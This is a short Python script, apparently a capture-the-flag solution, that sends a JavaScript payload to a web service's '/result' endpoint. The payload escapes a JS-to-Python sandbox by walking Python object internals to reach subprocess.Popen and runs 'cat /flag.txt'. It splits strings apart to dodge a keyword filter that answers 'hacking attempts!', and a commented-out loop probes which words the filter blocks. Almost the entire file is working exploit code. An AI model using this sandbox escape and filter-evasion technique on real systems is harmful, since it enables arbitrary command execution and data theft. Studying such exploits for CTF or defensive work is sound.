import requests

baseURL = "" # Your instance URL

def result(inputs):
    url = baseURL + "/result"
    sendJSON = {"inputs": inputs}
    r = requests.post(url, json=sendJSON)
    return r

exploit="""
let cmd = "ca" + "t /fla" + "g.txt"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o['_' + '_su' + 'bcl' + 'asses__']()) {
        let item = o['_' + '_s' + 'ubc' + 'lasses__']()[i]
        if(item.__module__ == "subpr" + "ocess" && item.__name__ == "Po" + "pen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
"""

"""
words = exploit.split()
words = set(words)
blocked = list()
for word in tqdm(words):
    # print("Exploit:", word)
    res = result(word).json()
    if res["result"].lower() == "hacking attempts!":
        blocked.append(word)

print(blocked)
"""

res = result(exploit).json()
if res["result"].lower() == "hacking attempts!":
    print("Failed")
else:
    print(res)
